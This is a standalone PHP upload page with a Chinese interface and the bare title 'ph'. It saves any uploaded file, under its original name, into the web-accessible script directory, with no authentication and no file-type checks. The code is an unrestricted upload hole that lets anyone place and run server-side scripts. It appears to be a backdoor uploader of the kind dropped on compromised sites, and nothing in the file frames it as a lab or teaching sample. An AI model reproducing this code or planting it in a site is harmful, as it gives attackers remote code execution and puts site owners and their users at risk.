<?php
@error_reporting(E_ALL);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['file'])) {
        $file = $_FILES['file'];
        
        $upload_dir = '';
        $target_file = $upload_dir . basename($file['name']);
        
        $result = move_uploaded_file($file['tmp_name'], $target_file);
        
        if ($result) {
            $message = '文件上传成功！';
            $msg_class = 'success';
        } else {
            $message = '文件上传失败';
            $msg_class = 'error';
        }
    } else {
        $message = '没有选择要上传的文件';
        $msg_class = 'error';
    }
}
?>

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>ph</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            padding: 20px;
        }
        .container {
            width: 100%;
            max-width: 480px;
        }
        h2 {
            text-align: center;
            color: #fff;
            font-size: 28px;
            font-weight: 700;
            letter-spacing: 3px;
            margin-bottom: 30px;
            text-shadow: 0 0 20px rgba(100, 100, 255, 0.5);
        }
        .upload-box {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 2px dashed rgba(255, 255, 255, 0.15);
            border-radius: 16px;
            padding: 50px 30px;
            text-align: center;
            transition: all 0.3s ease;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        .upload-box:hover {
            border-color: rgba(120, 120, 255, 0.4);
            box-shadow: 0 8px 40px rgba(80, 80, 200, 0.2);
        }
        .upload-icon {
            font-size: 48px;
            margin-bottom: 12px;
            display: block;
        }
        .upload-box p {
            color: rgba(255, 255, 255, 0.7);
            font-size: 15px;
            margin-bottom: 24px;
        }
        input[type="file"] {
            display: none;
        }
        .file-label {
            display: inline-block;
            padding: 12px 28px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            color: rgba(255, 255, 255, 0.8);
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s ease;
            background: rgba(255, 255, 255, 0.05);
        }
        .file-label:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: rgba(255, 255, 255, 0.4);
            color: #fff;
        }
        .file-name {
            color: rgba(255, 255, 255, 0.5);
            font-size: 13px;
            margin-top: 14px;
            min-height: 20px;
        }
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: #fff;
            padding: 14px 48px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            letter-spacing: 1px;
            margin-top: 28px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 25px rgba(102, 126, 234, 0.6);
        }
        .btn:active {
            transform: translateY(0);
        }
        .message {
            padding: 16px 20px;
            margin-bottom: 24px;
            border-radius: 12px;
            font-size: 14px;
            backdrop-filter: blur(8px);
            text-align: center;
        }
        .success {
            background: rgba(40, 167, 69, 0.15);
            color: #6fdb8b;
            border: 1px solid rgba(40, 167, 69, 0.3);
        }
        .error {
            background: rgba(220, 53, 69, 0.15);
            color: #f5848e;
            border: 1px solid rgba(220, 53, 69, 0.3);
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>ph</h2>
        
        <?php if (isset($message)): ?>
            <div class="message <?php echo $msg_class; ?>">
                <?php echo $message; ?>
            </div>
        <?php endif; ?>

        <form action="" method="post" enctype="multipart/form-data" class="upload-box">
            <span class="upload-icon">&#9729;</span>
            <p>请选择要上传的文件</p>
            <label class="file-label" for="fileInput">&#128193; 选择文件</label>
            <input type="file" name="file" id="fileInput" required onchange="document.getElementById('fileName').textContent = this.files[0] ? this.files[0].name : '未选择文件'">
            <div class="file-name" id="fileName">未选择文件</div>
            <button type="submit" class="btn">上 传</button>
        </form>
    </div>
</body>
</html>